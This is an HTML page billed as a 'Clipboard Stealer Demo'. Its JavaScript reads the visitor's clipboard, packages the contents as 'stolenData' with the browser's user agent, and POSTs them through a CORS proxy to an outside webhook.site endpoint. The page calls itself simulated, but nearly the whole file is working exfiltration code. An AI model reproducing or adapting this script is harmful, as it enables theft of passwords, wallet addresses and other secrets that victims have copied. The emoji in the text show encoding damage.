<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Clipboard Stealer Demo (Fixed)</title>
</head>
<body>
  <h1>üö® Simulated Clipboard Stealer</h1>
  <button onclick="stealClipboard()">Steal Clipboard & POST</button>
  <pre id="output"></pre>

  <script>
    async function stealClipboard() {
      const output = document.getElementById('output');

      try {
        const data = await navigator.clipboard.readText();
        output.textContent = "üìã Clipboard:\n" + data;

        const payload = {
          stolenData: data,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        };

        const realWebhook = "https://webhook.site/ed442c85-933a-4da3-987c-14d277c4d8e1"; // Replace if needed
        const proxy = "https://cors.bridged.cc/";
        const webhookURL = proxy + realWebhook;

        const response = await fetch(webhookURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        });

        const resultText = await response.text();
        output.textContent += `\n\n‚úÖ Sent to webhook.\nStatus: ${response.status}\nResponse: ${resultText}`;
      } catch (err) {
        output.textContent += `\n\n‚ùå Error: ${err}`;
        console.error("Fetch Error:", err);
      }
    }
  </script>
</body>
</html>
